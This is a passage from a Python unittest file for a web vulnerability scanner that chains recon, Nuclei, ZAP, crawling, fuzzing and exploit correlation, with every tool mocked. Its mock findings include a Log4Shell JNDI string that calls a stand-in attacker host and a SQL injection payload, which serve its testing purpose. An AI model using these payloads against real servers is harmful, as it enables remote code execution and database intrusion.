#!/usr/bin/env python3
"""Tests for packages.web.scanner — WebScanner orchestrator.

50+ integration tests covering:
- Initialization with different phase configs
- Each phase individually (mocked)
- Full pipeline (fully mocked)
- Finding aggregation and unified format
- Exploit correlation (mocked ExploitDB)
- Error handling (phase failures, partial results)
- Report generation
- Graceful degradation when tools are missing
"""

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch, PropertyMock

# ---------------------------------------------------------------------------
# Helpers — realistic mock data
# ---------------------------------------------------------------------------

MOCK_RECON_RESULT = {
    "success": True,
    "subdomains": ["www.example.com", "api.example.com"],
    "live_hosts": ["https://www.example.com", "https://api.example.com"],
    "endpoints": ["/login", "/api/users", "/api/admin"],
}

MOCK_NUCLEI_RESULT = {
    "success": True,
    "findings": [
        {
            "template_id": "cves/2021/CVE-2021-44228.yaml",
            "info": {
                "name": "Apache Log4j RCE",
                "severity": "critical",
                "cve-id": ["CVE-2021-44228"],
                "cwe-id": ["CWE-502"],
            },
            "matched-at": "https://api.example.com/api/users",
            "extracted-results": ['"jndi:ldap://attacker.com"'],
        }
    ],
}

MOCK_ZAP_ALERTS = [
    {
        "pluginId": "40012",
        "alert": "SQL Injection",
        "risk": "High",
        "confidence": "Medium",
        "url": "https://www.example.com/login",
        "param": "username",
        "evidence": "SQL error in response",
        "cweid": 89,
        "wascid": 19,
        "description": "SQL injection may be possible.",
        "solution": "Use parameterized queries.",
    }
]

MOCK_CRAWL_RESULT = {
    "visited_urls": ["https://www.example.com/", "https://www.example.com/login"],
    "discovered_urls": ["https://www.example.com/", "https://www.example.com/login", "https://www.example.com/admin"],
    "discovered_forms": [
        {"action": "https://www.example.com/login", "method": "POST", "inputs": {"username": {"type": "text"}, "password": {"type": "password"}}}
    ],
    "discovered_apis": [],
    "discovered_parameters": ["username", "password", "page"],
    "stats": {"total_pages": 2, "total_urls": 3, "total_forms": 1, "total_apis": 0, "total_parameters": 3},
}

MOCK_FUZZ_FINDINGS = [
    {
        "url": "https://www.example.com/login",
        "parameter": "username",
        "payload": "' OR '1'='1",
        "vulnerability_type": "sqli",
        "status_code": 500,
        "response_length": 1234,
    }
]

MOCK_EXPLOIT_RESULTS = [
    {
        "id": "EDB-12345",
        "description": "Apache Log4j Remote Code Execution",
        "type": "webapps",
        "platform": "java",
        "port": "8080",
        "cve": "CVE-2021-44228",
    }
]

MOCK_FINDING_RECON = {
    "id": "recon-001",
    "type": "recon",
    "severity": "info",
    "title": "Subdomain discovered: www.example.com",
    "url": "https://www.example.com",
    "parameter": None,
    "evidence": "subfinder output",
    "cve": None,
    "cwe": None,
    "confidence": "high",
    "source": "recon",
    "remediation": "N/A",
}

MOCK_FINDING_NUCLEI = {
    "id": "nuclei-001",
    "type": "nuclei",
    "severity": "critical",
    "title": "Apache Log4j RCE",
    "url": "https://api.example.com/api/users",
    "parameter": None,
    "evidence": '"jndi:ldap://attacker.com"',
    "cve": "CVE-2021-44228",
    "cwe": "CWE-502",
    "confidence": "high",
    "source": "nuclei",
    "remediation": "Upgrade Log4j to 2.17.0 or later.",
}

MOCK_FINDING_ZAP = {
    "id": "zap-001",
    "type": "zap",
    "severity": "high",
    "title": "SQL Injection",
    "url": "https://www.example.com/login",
    "parameter": "username",
    "evidence": "SQL error in response",
    "cve": None,
    "cwe": "CWE-89",
    "confidence": "medium",
    "source": "zap",
    "remediation": "Use parameterized queries.",
}

MOCK_FINDING_CRAWL = {
    "id": "crawl-001",
    "type": "crawl",
    "severity": "info",
    "title": "Discovered login form at https://www.example.com/login",
    "url": "https://www.example.com/login",
    "parameter": None,
    "evidence": "Form with inputs: username, password",
    "cve": None,
    "cwe": None,
    "confidence": "high",
    "source": "crawler",
    "remediation": "Ensure form uses HTTPS and CSRF protection.",
}

MOCK_FINDING_FUZZ = {
    "id": "fuzz-001",
    "type": "fuzz",
    "severity": "high",
    "title": "Potential SQL injection in parameter 'username'",
    "url": "https://www.example.com/login",
    "parameter": "username",
    "evidence": "Status 500 with payload: ' OR '1'='1",
    "cve": None,
    "cwe": "CWE-89",
    "confidence": "medium",
    "source": "fuzzer",
    "remediation": "Use parameterized queries and input validation.",
}


# ---------------------------------------------------------------------------
# Test cases — all with mocks; NO real tool calls
# ---------------------------------------------------------------------------

class TestScannerInitialization(unittest.TestCase):
    """Test scanner initialization with different phase configs."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_default_phases(self, mock_client_cls, mock_crawler_cls):
        """Test init with default phases (all enabled)."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertIn("recon", scanner.phases)
            self.assertIn("nuclei", scanner.phases)
            self.assertIn("zap", scanner.phases)
            self.assertIn("crawl", scanner.phases)
            self.assertIn("fuzz", scanner.phases)
            self.assertIn("correlate", scanner.phases)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_custom_phases(self, mock_client_cls, mock_crawler_cls):
        """Test init with custom phase list."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner(
                "http://example.com", out_dir=Path(tmpdir),
                phases=["recon", "nuclei"],
            )
            self.assertEqual(scanner.phases, ["recon", "nuclei"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_stores_base_url(self, mock_client_cls, mock_crawler_cls):
        """Test init stores base_url."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertEqual(scanner.base_url, "http://example.com")

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_stores_llm(self, mock_client_cls, mock_crawler_cls):
        """Test init stores LLM reference."""
        from packages.web.scanner import WebScanner
        mock_llm = MagicMock()
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", llm=mock_llm, out_dir=Path(tmpdir))
            self.assertIs(scanner.llm, mock_llm)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_creates_out_dir(self, mock_client_cls, mock_crawler_cls):
        """Test init creates output directory."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            out = Path(tmpdir) / "nested" / "out"
            WebScanner("http://example.com", out_dir=out)
            self.assertTrue(out.exists())

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_verify_ssl(self, mock_client_cls, mock_crawler_cls):
        """Test init passes verify_ssl to WebClient."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            WebScanner("http://example.com", out_dir=Path(tmpdir), verify_ssl=False)
            mock_client_cls.assert_called_once()
            kwargs = mock_client_cls.call_args
            self.assertEqual(kwargs.kwargs.get("verify_ssl") or kwargs[1].get("verify_ssl"), False)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_empty_phases_list(self, mock_client_cls, mock_crawler_cls):
        """Test init with empty phases list."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir), phases=[])
            self.assertEqual(scanner.phases, [])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_partial_phases(self, mock_client_cls, mock_crawler_cls):
        """Test init with a subset of phases."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner(
                "http://example.com", out_dir=Path(tmpdir),
                phases=["crawl", "fuzz", "correlate"],
            )
            self.assertEqual(set(scanner.phases), {"crawl", "fuzz", "correlate"})

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_without_llm_has_no_fuzzer(self, mock_client_cls, mock_crawler_cls):
        """Test init without LLM sets fuzzer to None."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", llm=None, out_dir=Path(tmpdir))
            self.assertIsNone(scanner.fuzzer)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_init_with_llm_creates_fuzzer(self, mock_client_cls, mock_crawler_cls):
        """Test init with LLM creates a WebFuzzer."""
        from packages.web.scanner import WebScanner
        mock_llm = MagicMock()
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", llm=mock_llm, out_dir=Path(tmpdir))
            self.assertIsNotNone(scanner.fuzzer)


class TestRunRecon(unittest.TestCase):
    """Test run_recon phase."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_recon_calls_orchestrator(self, mock_client_cls, mock_crawler_cls):
        """Test run_recon calls ReconOrchestrator.run()."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_orch_cls:
            mock_orch = MagicMock()
            mock_orch.run.return_value = MOCK_RECON_RESULT
            mock_orch_cls.return_value = mock_orch

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_recon("example.com")

            mock_orch_cls.assert_called_once()
            mock_orch.run.assert_called_once()
            self.assertTrue(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_recon_returns_subdomains(self, mock_client_cls, mock_crawler_cls):
        """Test run_recon returns subdomains in result."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_orch_cls:
            mock_orch = MagicMock()
            mock_orch.run.return_value = MOCK_RECON_RESULT
            mock_orch_cls.return_value = mock_orch

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_recon("example.com")

            self.assertIn("www.example.com", result["subdomains"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_recon_handles_failure(self, mock_client_cls, mock_crawler_cls):
        """Test run_recon handles orchestrator failure gracefully."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_orch_cls:
            mock_orch = MagicMock()
            mock_orch.run.side_effect = RuntimeError("recon tool not found")
            mock_orch_cls.return_value = mock_orch

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_recon("example.com")

            self.assertFalse(result["success"])
            self.assertIn("error", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_recon_import_error_fallback(self, mock_client_cls, mock_crawler_cls):
        """Test run_recon when ReconOrchestrator import fails."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator", side_effect=ImportError("no recon")):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_recon("example.com")

            self.assertFalse(result["success"])
            self.assertIn("error", result)


class TestRunNuclei(unittest.TestCase):
    """Test run_nuclei phase."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_nuclei_calls_runner(self, mock_client_cls, mock_crawler_cls):
        """Test run_nuclei calls NucleiRunner."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.NucleiRunner") as mock_runner_cls:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.run.return_value = {"success": True, "stdout": "scan done", "stderr": ""}
            mock_runner_cls.return_value = mock_runner

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_nuclei(["https://example.com"])

            mock_runner_cls.assert_called_once()
            mock_runner.run.assert_called_once()

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_nuclei_not_available(self, mock_client_cls, mock_crawler_cls):
        """Test run_nuclei when Nuclei binary is missing."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.NucleiRunner") as mock_runner_cls:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = False
            mock_runner_cls.return_value = mock_runner

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_nuclei(["https://example.com"])

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_nuclei_import_error(self, mock_client_cls, mock_crawler_cls):
        """Test run_nuclei when NucleiRunner import fails."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.NucleiRunner", side_effect=ImportError("no nuclei")):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_nuclei(["https://example.com"])

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_nuclei_returns_findings(self, mock_client_cls, mock_crawler_cls):
        """Test run_nuclei returns scan output."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.NucleiRunner") as mock_runner_cls:
            mock_runner = MagicMock()
            mock_runner.is_available.return_value = True
            mock_runner.run.return_value = {"success": True, "stdout": "found 3 vulns", "stderr": ""}
            mock_runner_cls.return_value = mock_runner

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_nuclei(["https://example.com"])

            self.assertTrue(result["success"])
            # Results are wrapped in "scans" list
            self.assertEqual(len(result["scans"]), 1)
            self.assertIn("stdout", result["scans"][0])


class TestRunZap(unittest.TestCase):
    """Test run_zap phase."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_zap_calls_scanner(self, mock_client_cls, mock_crawler_cls):
        """Test run_zap calls ZapScanner methods."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls:
            mock_zap = MagicMock()
            mock_zap.is_available.return_value = True
            mock_zap.spider_scan.return_value = {"scan_id": "1", "completed": True}
            mock_zap.active_scan.return_value = {"scan_id": "2", "completed": True}
            mock_zap.get_alerts.return_value = MOCK_ZAP_ALERTS
            mock_zap_cls.return_value = mock_zap

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_zap("https://example.com")

            mock_zap.spider_scan.assert_called_once()
            mock_zap.active_scan.assert_called_once()
            mock_zap.get_alerts.assert_called_once()

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_zap_not_available(self, mock_client_cls, mock_crawler_cls):
        """Test run_zap when ZAP is not available."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls:
            mock_zap = MagicMock()
            mock_zap.is_available.return_value = False
            mock_zap_cls.return_value = mock_zap

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_zap("https://example.com")

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_zap_import_error(self, mock_client_cls, mock_crawler_cls):
        """Test run_zap when ZapScanner import fails."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ZapScanner", side_effect=ImportError("no zapv2")):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_zap("https://example.com")

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_zap_returns_alerts(self, mock_client_cls, mock_crawler_cls):
        """Test run_zap returns alerts."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls:
            mock_zap = MagicMock()
            mock_zap.is_available.return_value = True
            mock_zap.spider_scan.return_value = {"scan_id": "1", "completed": True}
            mock_zap.active_scan.return_value = {"scan_id": "2", "completed": True}
            mock_zap.get_alerts.return_value = MOCK_ZAP_ALERTS
            mock_zap_cls.return_value = mock_zap

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_zap("https://example.com")

            self.assertEqual(result["alerts"], MOCK_ZAP_ALERTS)


class TestRunCrawl(unittest.TestCase):
    """Test run_crawl phase."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_crawl_calls_crawler(self, mock_client_cls, mock_crawler_cls):
        """Test run_crawl calls WebCrawler.crawl()."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.run_crawl("https://example.com")

            mock_crawler.crawl.assert_called_once()
            self.assertEqual(result["stats"]["total_pages"], 2)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_crawl_handles_exception(self, mock_client_cls, mock_crawler_cls):
        """Test run_crawl handles exceptions."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            mock_crawler = MagicMock()
            mock_crawler.crawl.side_effect = RuntimeError("network error")
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.run_crawl("https://example.com")

            self.assertFalse(result.get("success", True))

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_crawl_returns_parameters(self, mock_client_cls, mock_crawler_cls):
        """Test run_crawl returns discovered parameters."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.run_crawl("https://example.com")

            self.assertIn("username", result["discovered_parameters"])


class TestRunFuzz(unittest.TestCase):
    """Test run_fuzz phase."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_fuzz_calls_fuzzer(self, mock_client_cls, mock_crawler_cls):
        """Test run_fuzz calls fuzzer for each URL/param."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            mock_fuzzer = MagicMock()
            mock_fuzzer.fuzz_parameter.return_value = MOCK_FUZZ_FINDINGS
            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.fuzzer = mock_fuzzer

            urls = ["https://example.com/login"]
            params = ["username"]
            result = scanner.run_fuzz(urls, params)

            mock_fuzzer.fuzz_parameter.assert_called_once()
            self.assertEqual(len(result), 1)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_fuzz_no_fuzzer(self, mock_client_cls, mock_crawler_cls):
        """Test run_fuzz returns empty when no fuzzer."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", llm=None, out_dir=Path(tmpdir))
            # Ensure fuzzer is None
            scanner.fuzzer = None

            result = scanner.run_fuzz(["https://example.com"], ["param"])

            self.assertEqual(result, [])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_fuzz_empty_parameters(self, mock_client_cls, mock_crawler_cls):
        """Test run_fuzz with empty parameters list."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            mock_fuzzer = MagicMock()
            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.fuzzer = mock_fuzzer

            result = scanner.run_fuzz(["https://example.com"], [])

            self.assertEqual(result, [])
            mock_fuzzer.fuzz_parameter.assert_not_called()

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_fuzz_multiple_params(self, mock_client_cls, mock_crawler_cls):
        """Test run_fuzz calls fuzzer for each parameter."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            mock_fuzzer = MagicMock()
            mock_fuzzer.fuzz_parameter.return_value = MOCK_FUZZ_FINDINGS
            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.fuzzer = mock_fuzzer

            result = scanner.run_fuzz(["https://example.com"], ["user", "pass", "token"])

            self.assertEqual(mock_fuzzer.fuzz_parameter.call_count, 3)
            self.assertEqual(len(result), 3)


class TestCorrelateFindings(unittest.TestCase):
    """Test correlate_findings phase."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_calls_exploit_db_search(self, mock_client_cls, mock_crawler_cls):
        """Test correlate_findings calls ExploitSearcher."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitSearcher") as mock_searcher_cls:
            mock_searcher = MagicMock()
            mock_searcher.search.return_value = MOCK_EXPLOIT_RESULTS
            mock_searcher_cls.return_value = mock_searcher

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]

            result = scanner.correlate_findings()

            mock_searcher.search.assert_called()
            self.assertIn("correlations", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_no_cve_findings(self, mock_client_cls, mock_crawler_cls):
        """Test correlate_findings with no CVE findings."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitSearcher") as mock_searcher_cls:
            mock_searcher = MagicMock()
            mock_searcher_cls.return_value = mock_searcher

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_RECON]

            result = scanner.correlate_findings()

            self.assertEqual(len(result["correlations"]), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_import_error(self, mock_client_cls, mock_crawler_cls):
        """Test correlate_findings when ExploitSearcher import fails."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitSearcher", side_effect=ImportError("no exploit_db")):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]

            result = scanner.correlate_findings()

            self.assertIn("correlations", result)
            self.assertEqual(len(result["correlations"]), 0)


class TestFindingAggregation(unittest.TestCase):
    """Test aggregate_findings and unified finding format."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_returns_list(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate_findings returns a list."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {
                "recon": MOCK_RECON_RESULT,
                "nuclei": MOCK_NUCLEI_RESULT,
                "zap": {"alerts": MOCK_ZAP_ALERTS},
                "crawl": MOCK_CRAWL_RESULT,
                "fuzz": MOCK_FUZZ_FINDINGS,
            }

            findings = scanner.aggregate_findings()

            self.assertIsInstance(findings, list)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_finding_has_required_fields(self, mock_client_cls, mock_crawler_cls):
        """Test each aggregated finding has all required fields."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {
                "recon": MOCK_RECON_RESULT,
                "nuclei": MOCK_NUCLEI_RESULT,
                "zap": {"alerts": MOCK_ZAP_ALERTS},
                "crawl": MOCK_CRAWL_RESULT,
                "fuzz": MOCK_FUZZ_FINDINGS,
            }

            findings = scanner.aggregate_findings()

            required_fields = {"id", "type", "severity", "title", "url", "parameter",
                               "evidence", "cve", "cwe", "confidence", "source", "remediation"}
            for finding in findings:
                self.assertTrue(required_fields.issubset(finding.keys()))

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_nuclei_findings(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate creates findings from nuclei results."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"nuclei": {
                "success": True,
                "scans": [{
                    "target": "https://example.com",
                    "success": True,
                    "stdout": "found 3 vulns",
                    "stderr": "",
                }],
            }}

            findings = scanner.aggregate_findings()

            nuclei_findings = [f for f in findings if f["type"] == "nuclei"]
            self.assertGreater(len(nuclei_findings), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_zap_findings(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate creates findings from ZAP alerts."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"zap": {"alerts": MOCK_ZAP_ALERTS}}

            findings = scanner.aggregate_findings()

            zap_findings = [f for f in findings if f["type"] == "zap"]
            self.assertGreater(len(zap_findings), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_fuzz_findings(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate creates findings from fuzz results."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"fuzz": MOCK_FUZZ_FINDINGS}

            findings = scanner.aggregate_findings()

            fuzz_findings = [f for f in findings if f["type"] == "fuzz"]
            self.assertGreater(len(fuzz_findings), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_recon_findings(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate creates findings from recon results."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"recon": MOCK_RECON_RESULT}

            findings = scanner.aggregate_findings()

            recon_findings = [f for f in findings if f["type"] == "recon"]
            self.assertGreater(len(recon_findings), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_empty_results(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate with empty phase results."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {}

            findings = scanner.aggregate_findings()

            self.assertEqual(findings, [])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_finding_severity_values(self, mock_client_cls, mock_crawler_cls):
        """Test aggregated findings use valid severity values."""
        from packages.web.scanner import WebScanner
        valid_severities = {"critical", "high", "medium", "low", "info"}
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {
                "nuclei": MOCK_NUCLEI_RESULT,
                "zap": {"alerts": MOCK_ZAP_ALERTS},
            }

            findings = scanner.aggregate_findings()

            for f in findings:
                self.assertIn(f["severity"], valid_severities)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_unique_ids(self, mock_client_cls, mock_crawler_cls):
        """Test aggregated findings have unique IDs."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {
                "nuclei": MOCK_NUCLEI_RESULT,
                "zap": {"alerts": MOCK_ZAP_ALERTS},
                "fuzz": MOCK_FUZZ_FINDINGS,
            }

            findings = scanner.aggregate_findings()
            ids = [f["id"] for f in findings]
            self.assertEqual(len(ids), len(set(ids)), "Finding IDs are not unique")


class TestFullPipeline(unittest.TestCase):
    """Test full scan pipeline with mocked tools."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_full_scan_all_phases(self, mock_client_cls, mock_crawler_cls):
        """Test full scan runs all phases and returns results."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_recon_cls, \
             patch("packages.web.scanner.NucleiRunner") as mock_nuclei_cls, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls, \
             patch("packages.web.scanner.save_json"):
            # Setup recon
            mock_recon = MagicMock()
            mock_recon.run.return_value = MOCK_RECON_RESULT
            mock_recon_cls.return_value = mock_recon

            # Setup nuclei
            mock_nuclei = MagicMock()
            mock_nuclei.is_available.return_value = True
            mock_nuclei.run.return_value = MOCK_NUCLEI_RESULT
            mock_nuclei_cls.return_value = mock_nuclei

            # Setup ZAP
            mock_zap = MagicMock()
            mock_zap.is_available.return_value = True
            mock_zap.spider_scan.return_value = {"scan_id": "1", "completed": True}
            mock_zap.active_scan.return_value = {"scan_id": "2", "completed": True}
            mock_zap.get_alerts.return_value = MOCK_ZAP_ALERTS
            mock_zap_cls.return_value = mock_zap

            # Setup crawler
